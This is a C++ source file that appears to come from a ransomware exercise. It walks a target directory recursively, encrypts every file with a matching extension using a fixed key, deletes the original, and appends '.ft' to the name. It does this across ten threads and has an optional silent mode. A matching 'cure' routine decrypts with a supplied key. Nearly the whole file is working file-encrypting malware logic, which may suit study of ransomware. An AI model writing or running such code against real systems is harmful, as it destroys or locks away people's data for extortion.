#include "../include/disease.hpp"

static std::pair<std::vector<std::string>, std::vector<std::string>> getFilesToCure(bool isSilenced)
{
	std::vector<std::string> infectedFilenames;	
	std::vector<std::string> curedFilenames;

	try
	{
		for (const auto& entry : std::filesystem::recursive_directory_iterator(INFECTION_DIR))
		{
			try
			{
				if (!entry.is_regular_file())
					continue;

				std::string filename = entry.path().filename().string();
				size_t pos = filename.find(".ft");

				if (pos != std::string::npos)
					filename.erase(pos, 3);

				std::filesystem::path curedFile = entry.path().parent_path() / filename;

				infectedFilenames.push_back(entry.path().string());
				curedFilenames.push_back(curedFile);
			}
			catch (const std::exception& e)
			{
				if (!isSilenced)
					std::cerr << "Failed to get file to cure: " << e.what() << std::endl;
				continue;
			}
		}
	}
	catch (const std::exception& e)
	{
		if (!isSilenced)
			std::cerr << "Failed to get file to cure: " << e.what() << std::endl;
	}

	return {infectedFilenames, curedFilenames};
}

static std::pair<std::vector<std::string>, std::vector<std::string>> getFilesToInfect(bool isSilenced)
{
	std::vector<std::string> victimFilenames;
	std::vector<std::string> infectedFilenames;

	try
	{
		for (const auto& entry : std::filesystem::recursive_directory_iterator(INFECTION_DIR))
		{
			try
			{
				if (!entry.is_regular_file())
					continue;
				
				std::string fileExtension = entry.path().filename().extension().string();

				if (isExtensionValid(fileExtension))
				{
					std::string filename = entry.path().filename().string();
					std::filesystem::path infectedFile = entry.path().parent_path() / filename;

					if (infectedFile.string().find(".ft") == std::string::npos)
						infectedFile += ".ft";

					victimFilenames.push_back(entry.path().string());
					infectedFilenames.push_back(infectedFile.string());
				}
			}
			catch (const std::exception& e)
			{
				if (!isSilenced)
					std::cerr << "Failed to get file to infect: " << e.what() << std::endl;
				continue;
			}
		}
	}
	catch (const std::exception& e)
	{
		if (!isSilenced)
			std::cerr << "Failed to get file to infect: " << e.what() << std::endl;
	}

	return {victimFilenames, infectedFilenames};
}

static void infect(const std::vector<std::string> vfs, const std::vector<std::string> ifs, int start, int end, bool isSilenced)
{
	for (int i = start; i < end; i++)
	{
		if (!isSilenced)
			std::cout << "Infecting " << vfs[i] << std::endl;

		try
		{
			encryptFile(vfs[i], ifs[i], INFECTION_KEY);
			std::filesystem::remove(vfs[i]);
		}
		catch(const std::exception& e)
		{
			if (!isSilenced)
				std::cerr << "Failed to infect: " << vfs[i] << std::endl << e.what() << std::endl;
			continue;
		}
	}
}

static void cure(const std::vector<std::string> ifs, const std::vector<std::string> cfs, int start, int end, std::string medicine, bool isSilenced)
{
	for (int i = start; i < end; i++)
	{
		if (!isSilenced)
			std::cout << "Curing " << ifs[i] << std::endl;

		try
		{
			decryptFile(ifs[i], cfs[i], medicine);
			std::filesystem::remove(ifs[i]);
		}
		catch(const std::exception& e)
		{
			if (!isSilenced)
				std::cerr << "Failed to cure: " << ifs[i] << std::endl << e.what() << std::endl;
			continue;
		}
	}
}

void cureThreads(std::string medicine, bool isSilenced)
{
	std::vector<std::thread> threads;

	auto [infectedFilenames, curedFilenames] = getFilesToCure(isSilenced);
	int numThreads = 10;
	int jobSize = (infectedFilenames.size() + numThreads - 1) / numThreads;

	for (int i = 0; i < numThreads; i++)
	{
		int start = i * jobSize;
		int end = std::min(static_cast<size_t>(start + jobSize), infectedFilenames.size());
	
		if (start >= infectedFilenames.size())
			break;

		try
		{
			threads.emplace_back(cure, infectedFilenames, curedFilenames, start, end, medicine, isSilenced);
		}
		catch(const std::exception& e)
		{
			if (!isSilenced)
				std::cerr << "Curing error: " << e.what() << std::endl;
			continue;
		}
	}

	for (auto& th : threads)
		th.join();
}

void infectThreads(bool isSilenced)
{
	std::vector<std::thread> threads;

	auto [victimFilenames, infectedFilenames] = getFilesToInfect(isSilenced);
	int numThreads = 10;
	int jobSize = (victimFilenames.size() + numThreads - 1) / numThreads;

	for (int i = 0; i < numThreads; i++)
	{
		int start = i * jobSize;
		int end = std::min(static_cast<size_t>(start + jobSize), victimFilenames.size());
	
		if (start >= victimFilenames.size())
			break;

		try
		{
			threads.emplace_back(infect, victimFilenames, infectedFilenames, start, end, isSilenced);
		}
		catch(const std::exception& e)
		{
			if (!isSilenced)
				std::cerr << "Infection error: " << e.what() << std::endl;
			continue;
		}
	}

	for (auto& th : threads)
		th.join();
}